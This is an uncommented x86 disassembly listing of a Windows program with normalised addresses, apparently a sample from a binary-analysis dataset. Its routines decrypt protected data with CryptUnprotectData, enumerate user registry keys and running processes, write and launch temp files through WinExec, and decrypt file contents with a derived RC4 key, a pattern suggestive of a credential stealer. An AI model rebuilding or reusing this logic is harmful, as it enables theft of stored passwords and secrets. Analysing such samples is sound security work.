lea eax [ ebp - 0x8160 ]
push eax
push [ ebp + 0x7c ]
call esi
cmp eax 0xea
je r-xdata
add [ ebp + 0x68 ] 0x400
push [ ebp + 0x68 ]
push edi
call sub_4114aa
pop ecx
pop ecx
mov edi eax
cmp eax ebx
jne r-xdata
push [ ebp + 0x40 ]
call [ GlobalFree@IAT ]
mov esi [ ebp + 0x60 ]
lea esi [ esi + esi + 0x2 ]
push esi
push 0x1
call sub_410962
push esi
push eax
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x60 ]
add eax eax
push eax
lea eax [ ebp - 0x8160 ]
push eax
call sub_403f06
add esp 0x18
push [ ebp + 0x64 ]
lea ecx [ ebp + 0x44 ]
call sub_40f4c7
push [ ebp + 0x64 ]
call sub_410a7a
cmp [ ebp + 0x54 ] 0x1
pop ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x54 ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
cmp [ ebp + 0x54 ] 0x3
jne r-xdata
lea ecx [ ebp + 0x44 ]
call sub_40f609
push r--data
lea ecx [ ebp - 0x20 ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp + 0x7 ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp + 0x7 ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x3a ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x3a ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x6 ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x6 ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x13 ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x13 ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x2d ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x2d ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x47 ]
call sub_40f45c
push eax
lea ecx [ ebp + 0x44 ]
call sub_40f8a9
lea ecx [ ebp - 0x47 ]
mov [ ebp + 0x6f ] al
call sub_40f609
cmp [ ebp + 0x6f ] bl
je r-xdata
push [ ebp + 0x78 ]
push [ ebp + 0x7c ]
call sub_40c124
pop ecx
pop ecx
lea eax [ ebp - 0x8160 ]
push eax
call [ lstrlenW@IAT ]
mov esi eax
add esi esi
push esi
call sub_411160
push esi
push eax
mov [ ebp + 0x64 ] eax
lea eax [ ebp - 0x8160 ]
push 0xffffffff
push eax
call sub_403f06
add esp 0x14
push [ ebp + 0x64 ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x78 ]
call sub_40ec7e
push [ ebp + 0x64 ]
call sub_410a7a
push [ ebp + 0x68 ]
push 0x1
call sub_410962
push r--data
push [ ebp + 0x48 ]
mov [ ebp + 0x64 ] eax
mov esi edi
call sub_41188f
add esp 0x14
test eax eax
je r-xdata
push [ ebp + 0x68 ]
push [ ebp + 0x64 ]
push [ ebp + 0x68 ]
push esi
call sub_403f06
add esp 0x10
mov esi eax
mov eax [ ebp + 0x68 ]
mov [ ebp + 0x28 ] eax
lea eax [ ebp + 0x34 ]
push eax
push 0x1
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp + 0x28 ]
inc edi
push eax
mov [ ebp + 0x2c ] edi
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
lea esi [ edi + 0x2 ]
push [ ebp + 0x64 ]
push esi
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x78 ]
call sub_40ec7e
mov edi 0x400
push edi
call sub_411051
push edi
mov esi eax
push esi
push [ ebp + 0x34 ]
push [ ebp + 0x38 ]
call sub_403f06
mov edi eax
mov eax rw-data
add esp 0x14
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x78 ]
call sub_40ec7e
push esi
push edi
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x78 ]
call sub_40ec7e
push esi
call sub_410d3e
pop ecx
push [ ebp + 0x38 ]
call [ LocalFree@IAT ]
jmp r-xdata
push [ ebp + 0x64 ]
call sub_410d3e
pop ecx
sub_40495a
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
leave
retn
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40453a
pop ecx
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_40498e
push ebp
mov ebp esp
sub esp 0xc
push edi
lea eax [ ebp - 0x8 ]
push eax
mov edi rw-data
push edi
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop edi
leave
retn
push ebx
push esi
push edi
call [ lstrlenA@IAT ]
push 0x400
mov esi eax
push 0x40
add esi edi
call [ GlobalAlloc@IAT ]
xor edi edi
mov ebx eax
mov [ ebp - 0x4 ] edi
call [ GlobalFree@IAT ]
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
pop esi
pop ebx
lea eax [ esi + 0x1 ]
push eax
mov [ esi ] 0x5c
call [ lstrcpyA@IAT ]
push [ ebp + 0x8 ]
call sub_40495a
inc [ ebp - 0x4 ]
pop ecx
jmp r-xdata
push edi
mov [ ebp - 0xc ] 0x3ff
call [ SetLastError@IAT ]
push edi
push edi
push edi
push edi
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call [ RegEnumKeyExA@IAT ]
test eax eax
push ebx
jne r-xdata
sub_404a26
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi rw-data
push esi
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn
push ebx
push edi
push 0x400
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
xor ebx ebx
push edi
call [ GlobalFree@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop ebx
push rw-data
push edi
push esi
push rw-data
push rw-data
call [ wsprintfA@IAT ]
push [ ebp + 0x8 ]
call sub_40498e
add esp 0x18
inc ebx
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ebx
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x3ff
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_404ab2
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi rw-data
push esi
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn
push ebx
push edi
push 0x400
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
xor ebx ebx
call [ GlobalFree@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop ebx
push esi
push rw-data
push rw-data
call [ wsprintfA@IAT ]
push [ ebp + 0x8 ]
call sub_40498e
add esp 0x14
inc ebx
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ebx
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x3ff
call [ RegEnumKeyExA@IAT ]
test eax eax
push edi
jne r-xdata
sub_404b38
push ebp
mov ebp esp
sub esp 0x38
push esi
push edi
call sub_40f095
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esp
mov [ ebp - 0xc ] ebp
lea eax [ ebp - 0x4 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
mov [ ebp - 0x18 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] sub_40f09c
lea eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
pop edi
pop esi
leave
retn
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40eb9e
cmp [ rw-data ] esi
je r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
push edi
call sub_40e6f3
pop ecx
jmp r-xdata
push esi
push esi
push esi
push rw-data
call eax
call sub_40b8bd
lea eax [ ebp - 0x38 ]
push eax
mov [ rw-data ] esi
call sub_4044d1
pop ecx
lea ecx [ ebp - 0x38 ]
call sub_40ed8a
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40eb9e
push rw-data
push rw-data
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x38 ]
push eax
mov [ rw-data ] 0x1
call sub_40498e
lea eax [ ebp - 0x38 ]
push eax
mov [ rw-data ] 0x2
call sub_404a26
lea eax [ ebp - 0x38 ]
push eax
mov [ rw-data ] 0x3
call sub_404ab2
add esp 0xc
push edi
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0x38 ]
call sub_40ed8a
mov eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
lea ecx [ ebp - 0x38 ]
call sub_40ed8a
jmp r-xdata
cmp eax esi
jne r-xdata
sub_404c98
push ebx
push esi
push edi
mov esi 0x400
push esi
call sub_411160
push esi
mov ebx eax
call sub_411160
pop ecx
pop ecx
push ebx
push esi
mov edi eax
call [ GetTempPathA@IAT ]
push edi
push 0x1
push 0x0
push ebx
call [ GetTempFileNameA@IAT ]
push r--data
push edi
call sub_411657
call sub_40b79a
push r--data
push edi
call sub_410c4c
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_40b8bd
push 0x0
push edi
call [ WinExec@IAT ]
push ebx
call sub_410a7a
push edi
call sub_410a7a
pop ecx
pop ecx
pop edi
pop esi
pop ebx
retn
push [ rw-data ]
push r--data
push esi
call sub_410c5f
push esi
call sub_410b53
add esp 0x10
sub_404d24
push ebp
mov ebp esp
mov eax 0x1828
call sub_40f8bc
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x28 ]
call sub_40eb9e
lea eax [ ebp - 0x10 ]
push eax
push 0x1000
lea eax [ ebp - 0x1828 ]
push eax
call EnumProcesses
test eax eax
je r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
push 0x2
shr eax 0x2
pop ecx
cmp eax ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + eax * 4 - 0x1828 ]
mov esi r--data
lea edi [ ebp - 0x828 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x7f6
xor edi edi
lea eax [ ebp - 0x81e ]
push edi
push eax
call sub_41112d
add esp 0xc
push ebx
push edi
push 0x410
call [ OpenProcess@IAT ]
cmp eax edi
mov [ ebp - 0xc ] eax
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
push 0x800
lea ecx [ ebp - 0x828 ]
push ecx
push edi
push eax
call GetModuleFileNameExA
lea eax [ ebp - 0x828 ]
push r--data
push eax
call sub_41188f
cmp eax edi
pop ecx
pop ecx
je r-xdata
xor eax eax
push r--data
push eax
call sub_41188f
pop ecx
pop ecx
jmp r-xdata
xor esi esi
push r--data
push eax
call sub_41188f
pop ecx
pop ecx
mov esi eax
jmp r-xdata
cmp eax edi
je r-xdata
xor ebx ebx
push r--data
push esi
call sub_41188f
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
cmp esi edi
je r-xdata
xor eax eax
push r--data
push eax
call sub_41188f
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x828 ]
push r--data
push eax
call sub_41188f
cmp esi edi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x828 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_40cd53
lea eax [ ebp - 0x828 ]
push eax
call sub_40d076
add esp 0x10
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
cmp ebx edi
je r-xdata
cmp eax edi
je r-xdata
mov [ rw-data ] 0x1
sub_404ebb
push ebp
mov ebp esp
sub esp 0x800
push esi
mov esi [ SHGetFolderPathA@IAT ]
push edi
lea eax [ ebp - 0x400 ]
push eax
xor edi edi
push edi
push edi
push 0x8
push edi
call esi
test eax eax
je r-xdata
push ebx
push 0x400
lea eax [ ebp - 0x800 ]
push eax
push edi
call [ GetModuleFileNameA@IAT ]
mov ebx [ StrStrIA@IAT ]
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x800 ]
push eax
call ebx
test eax eax
je r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0x400 ]
push eax
push edi
push edi
push 0x7
push edi
call esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x800 ]
push eax
call ebx
test eax eax
setne al
xor al al
jmp r-xdata
pop ebx
sub_404f46
push ebp
mov ebp esp
sub esp 0x408
push ebx
push esi
push 0x400
lea eax [ ebp - 0x408 ]
xor ebx ebx
push eax
push ebx
mov [ ebp - 0x1 ] bl
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x408 ]
push r--data
push eax
call sub_410c4c
mov esi eax
cmp esi ebx
pop ecx
pop ecx
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
leave
retn
push edi
push 0x2
push ebx
push esi
call sub_410e24
push esi
call sub_410e80
push ebx
push ebx
push esi
mov edi eax
call sub_410e24
lea eax [ edi + 0x5 ]
push eax
call sub_411160
push esi
push edi
push 0x1
push eax
mov [ ebp - 0x8 ] eax
call sub_410d0d
push esi
call sub_410b53
push r--data
push [ ebp + 0x8 ]
call sub_410c4c
mov esi eax
add esp 0x3c
cmp esi ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_410a7a
pop ecx
pop edi
push esi
push edi
push 0x1
push [ ebp - 0x8 ]
call sub_410e93
push esi
call sub_410b53
add esp 0x14
mov [ ebp - 0x1 ] 0x1
sub_404ff8
push ebp
mov ebp esp
sub esp 0xb0
push ebx
push esi
push edi
mov esi 0x12c
push esi
call sub_411160
push esi
xor ebx ebx
push ebx
push eax
mov [ ebp - 0x4 ] eax
call sub_41112d
add esp 0x10
push [ ebp - 0x4 ]
push esi
call [ GetTempPathA@IAT ]
push esi
call sub_411160
push esi
mov edi eax
push ebx
push edi
mov [ ebp - 0x8 ] edi
call sub_41112d
add esp 0x10
push edi
push 0x2
push ebx
push [ ebp - 0x4 ]
call [ GetTempFileNameA@IAT ]
push r--data
push edi
call sub_411657
pop ecx
pop ecx
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push edi
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x28
pop ecx
mov esi r--data
lea edi [ ebp - 0xb0 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor esi esi
push ebx
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + esi - 0xb0 ]
push eax
push [ ebp - 0x4 ]
call [ WriteFile@IAT ]
inc esi
cmp esi 0xa2
jl r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call sub_40b559
push 0x1f4
call sub_411160
push [ ebp - 0x8 ]
mov edi eax
push edi
call sub_4116d8
push r--data
push edi
call sub_411657
mov esi r--data
push esi
push edi
call sub_411657
push [ ebp + 0x8 ]
push edi
call sub_411657
push esi
push edi
call sub_411657
add esp 0x2c
call sub_40b79a
push ebx
push edi
call [ WinExec@IAT ]
sub_40510e
push ebp
mov ebp esp
mov eax 0x141c
call sub_40f8bc
push esi
mov esi [ SHGetFolderPathA@IAT ]
push edi
xor edi edi
lea eax [ ebp - 0xc1c ]
push eax
push edi
push edi
push 0x8
push edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call esi
test eax eax
je r-xdata
push ebx
mov ebx 0x400
push ebx
lea eax [ ebp - 0x141c ]
push eax
push edi
call [ GetModuleFileNameA@IAT ]
call sub_404ebb
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x101c ]
push eax
mov [ ebp - 0x1c ] ebx
call [ GetUserNameA@IAT ]
lea eax [ ebp - 0x101c ]
push r--data
push eax
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ ebp - 0x8 ] 0x1
pop edi
pop esi
leave
retn
cmp [ ebp - 0x8 ] edi
je r-xdata
push 0x2
pop eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
pop ebx
mov eax [ ebp - 0x4 ]
lea eax [ ebp - 0xc1c ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0xc1c ]
push r--data
push eax
call sub_410c4c
add esp 0x10
cmp eax edi
je r-xdata
lea eax [ ebp - 0x41c ]
push eax
push ebx
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x41c ]
push eax
call sub_404f46
add esp 0xc
test al al
lea eax [ ebp - 0x41c ]
push eax
jne r-xdata
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
push eax
call sub_410b53
pop ecx
call sub_404ff8
pop ecx
jmp r-xdata
push edi
push edi
push 0x8
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push r--data
mov ebx r--data
push ebx
mov esi 0x80000001
push esi
call sub_40c03c
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0xc1c ]
push eax
call sub_404f46
mov esi [ WinExec@IAT ]
neg al
pop ecx
push edi
push r--data
sbb eax eax
neg eax
mov [ ebp - 0x4 ] eax
call esi
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x81c ]
push r--data
push eax
call sub_4116d8
mov ebx r--data
lea eax [ ebp - 0x81c ]
push ebx
push eax
call sub_411657
lea eax [ ebp - 0xc1c ]
push eax
lea eax [ ebp - 0x81c ]
push eax
call sub_411657
lea eax [ ebp - 0x81c ]
push ebx
push eax
call sub_411657
add esp 0x20
push edi
lea eax [ ebp - 0x81c ]
push eax
call esi
mov eax [ ebp - 0x10 ]
add eax 0x4
movzx eax ax
cdq
push 0x18
pop ecx
idiv ecx
push 0xa
pop ecx
mov bl 0x30
push edi
movzx eax dx
mov [ ebp - 0x10 ] dx
cdq
idiv ecx
add al bl
mov [ ebp - 0x819 ] al
lea eax [ ebp - 0x81c ]
add dl bl
push eax
mov [ ebp - 0x818 ] dl
call esi
add [ ebp - 0x10 ] 0xfff8
movzx eax [ ebp - 0x10 ]
push 0xa
cdq
pop ecx
idiv ecx
push edi
add al bl
mov [ ebp - 0x819 ] al
lea eax [ ebp - 0x81c ]
add dl bl
push eax
mov [ ebp - 0x818 ] dl
call esi
add [ ebp - 0x10 ] 0xfffc
movzx eax [ ebp - 0x10 ]
cdq
push 0xa
pop ecx
idiv ecx
add al bl
mov [ ebp - 0x819 ] al
push edi
lea eax [ ebp - 0x81c ]
add dl bl
push eax
mov [ ebp - 0x818 ] dl
call esi
add [ ebp - 0x10 ] 0x10
movzx eax [ ebp - 0x10 ]
push 0xa
cdq
pop ecx
idiv ecx
push edi
add al bl
mov [ ebp - 0x819 ] al
lea eax [ ebp - 0x81c ]
add dl bl
push eax
mov [ ebp - 0x818 ] dl
call esi
jmp r-xdata
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x41c ]
push eax
call sub_404f46
add esp 0xc
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0xc1c ]
push eax
push edi
push edi
push 0x7
push edi
call [ SHGetFolderPathA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x141c ]
push eax
lea eax [ ebp - 0x41c ]
push eax
call sub_4116d8
lea eax [ ebp - 0x41c ]
push r--data
push eax
mov [ ebp - 0x419 ] 0x0
call sub_411657
lea eax [ ebp - 0x41c ]
push eax
call sub_404f46
add esp 0x14
test al al
je r-xdata
lea eax [ ebp - 0x41c ]
push eax
push 0x3
push edi
lea eax [ ebp - 0xc1c ]
push eax
call [ GetTempFileNameA@IAT ]
lea eax [ ebp - 0x41c ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x41c ]
push eax
call sub_404f46
neg al
push 0x5
sbb eax eax
neg eax
mov [ ebp - 0x4 ] eax
call sub_411160
push r--data
push eax
mov [ ebp - 0x8 ] eax
call sub_4116d8
push 0x4
push [ ebp - 0x8 ]
push r--data
push ebx
push esi
call sub_40c0bc
add esp 0x2c
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4054ac
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
xor esi esi
cmp [ edi ] bl
je r-xdata
push 0xf0000000
push 0x1
push r--data
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov [ esi + edi ] bl
mov [ esi + edi + 0x1 ] bl
mov [ ebp - 0x14 ] esi
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0x8 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push r--data
push [ ebp + 0x8 ]
call sub_4115f3
mov al [ ebp - 0x10 ]
add [ ebp + 0x8 ] 0x2
mov [ esi + edi ] al
mov eax [ ebp + 0x8 ]
add esp 0xc
inc esi
cmp [ eax ] bl
jne r-xdata
push ebx
push 0x10
push r--data
push [ ebp - 0x4 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0x64
jge r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x800000
push [ ebp - 0x4 ]
push 0x6801
push [ ebp - 0x8 ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push edi
push ebx
push 0x1
push ebx
push [ ebp - 0xc ]
call [ CryptDecrypt@IAT ]
test eax eax
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyKey@IAT ]
push [ ebp - 0x4 ]
call [ CryptDestroyHash@IAT ]
push ebx
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
xor eax eax
sub_40559c
push ebp
lea ebp [ esp - 0x74 ]
mov eax 0x1090
call sub_40f8bc
push ebx
push esi
push edi
mov esi 0x104
push esi
push [ ebp + 0x7c ]
lea eax [ ebp - 0x214 ]
xor ebx ebx
push eax
mov [ ebp + 0x6c ] ebx
mov [ ebp + 0x64 ] ebx
call sub_4117bc
push esi
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_411765
mov edi [ FindFirstFileA@IAT ]
add esp 0x18
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call edi
cmp eax 0xffffffff
mov [ ebp + 0x68 ] eax
jne r-xdata
lea eax [ ebp - 0xe4 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x110 ]
push eax
push [ ebp + 0x68 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xe4 ]
push r--data
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
add ebp 0x74
leave
retn
push [ ebp + 0x68 ]
call [ FindClose@IAT ]
push esi
push [ ebp + 0x7c ]
lea eax [ ebp - 0x214 ]
push eax
call sub_4117bc
push esi
lea eax [ ebp - 0x214 ]
push r--data
push eax
call sub_411765
add esp 0x18
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call edi
cmp eax 0xffffffff
mov [ ebp + 0x68 ] eax
je r-xdata
test [ ebp - 0x110 ] 0x10
je r-xdata
push esi
push [ ebp + 0x7c ]
lea eax [ ebp - 0x318 ]
push eax
call sub_4117bc
push esi
lea eax [ ebp - 0x318 ]
push r--data
push eax
call sub_411765
push esi
lea eax [ ebp - 0xe4 ]
push eax
lea eax [ ebp - 0x318 ]
push eax
call sub_411765
add esp 0x24
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
lea eax [ ebp - 0x318 ]
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x60 ] eax
je r-xdata
push esi
push [ ebp + 0x7c ]
lea eax [ ebp - 0x41c ]
push eax
call sub_4117bc
push esi
lea eax [ ebp - 0x41c ]
push r--data
push eax
call sub_411765
push esi
lea eax [ ebp - 0xe4 ]
push eax
lea eax [ ebp - 0x41c ]
push eax
call sub_411765
lea eax [ ebp - 0x41c ]
push eax
call sub_40559c
add esp 0x28
cmp [ ebp + 0x6c ] ebx
je r-xdata
push ebx
push eax
call [ GetFileSize@IAT ]
push ebx
mov edi eax
push edi
push ebx
push 0x2
push ebx
push [ ebp + 0x60 ]
call [ CreateFileMappingA@IAT ]
cmp eax ebx
mov [ ebp + 0x64 ] eax
je r-xdata
cmp [ ebp + 0x64 ] ebx
je r-xdata
push [ ebp + 0x6c ]
call [ UnmapViewOfFile@IAT ]
mov [ ebp + 0x6c ] ebx
push edi
push ebx
push ebx
push 0x4
push eax
call [ MapViewOfFile@IAT ]
cmp eax ebx
mov [ ebp + 0x6c ] eax
je r-xdata
cmp [ ebp + 0x60 ] ebx
je r-xdata
push [ ebp + 0x64 ]
call [ CloseHandle@IAT ]
mov [ ebp + 0x64 ] ebx
mov edi 0x400
push edi
lea eax [ ebp - 0xc1c ]
push ebx
push eax
call sub_41112d
push edi
lea eax [ ebp - 0x101c ]
push ebx
push eax
call sub_41112d
push edi
lea eax [ ebp - 0x81c ]
push ebx
push eax
call sub_41112d
push r--data
push [ ebp + 0x6c ]
call sub_41188f
add esp 0x2c
cmp eax ebx
mov [ ebp + 0x70 ] eax
je r-xdata
lea eax [ ebp - 0x110 ]
push eax
push [ ebp + 0x68 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x60 ]
call [ CloseHandle@IAT ]
push r--data
push eax
call sub_41188f
mov edi eax
cmp edi ebx
pop ecx
pop ecx
je r-xdata
push [ ebp + 0x68 ]
call [ FindClose@IAT ]
xor eax eax
push r--data
call sub_411738
sub edi [ ebp + 0x70 ]
pop ecx
sub edi eax
inc edi
push edi
push r--data
call sub_411738
add eax [ ebp + 0x70 ]
pop ecx
push eax
lea eax [ ebp - 0xc1c ]
push eax
call sub_4117bc
push r--data
push [ ebp + 0x6c ]
call sub_41188f
add esp 0x14
cmp eax ebx
mov [ ebp + 0x70 ] eax
je r-xdata
push r--data
push eax
call sub_41188f
mov edi eax
cmp edi ebx
pop ecx
pop ecx
je r-xdata
push r--data
call sub_411738
sub edi [ ebp + 0x70 ]
pop ecx
sub edi eax
inc edi
push edi
push r--data
call sub_411738
add eax [ ebp + 0x70 ]
pop ecx
push eax
lea eax [ ebp - 0x101c ]
push eax
call sub_4117bc
push r--data
push [ ebp + 0x6c ]
call sub_41188f
add esp 0x14
cmp eax ebx
mov [ ebp + 0x70 ] eax
je r-xdata
push r--data
push eax
call sub_41188f
mov edi eax
cmp edi ebx
pop ecx
pop ecx
je r-xdata
push r--data
call sub_411738
sub edi [ ebp + 0x70 ]
pop ecx
sub edi eax
inc edi
push edi
push r--data
call sub_411738
add eax [ ebp + 0x70 ]
pop ecx
push eax
lea eax [ ebp - 0x81c ]
push eax
call sub_4117bc
lea eax [ ebp - 0x81c ]
push eax
call sub_4054ac
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0xc1c ]
push eax
call sub_411738
push eax
